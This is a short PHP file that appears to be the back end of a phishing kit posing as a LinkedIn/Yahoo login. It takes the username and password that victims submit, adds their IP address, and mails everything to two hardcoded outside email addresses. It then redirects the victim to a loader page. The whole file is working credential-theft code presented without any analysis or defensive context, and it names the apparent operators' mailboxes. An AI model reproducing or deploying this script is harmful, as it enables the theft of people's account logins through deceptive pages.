<?
session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$username = $_POST['username'];
$password = $_POST['passwd'];
$chasem3="cokerconsultancy8119@gmail.com, chrisyoungmusic6@yahoo.com";


  $subj = "New LinkedinYahoo Login $ip";
  $msg = "Email: $username\nPassword: $password\n$ip\n-----------------------------------\n        Created By Cokeboi\n-----------------------------------";
  $from = "From: <ssc@sscs.com>";
    mail("$chasem3", $subj, $msg, $from);
	
	header("Location: loader.html");
?>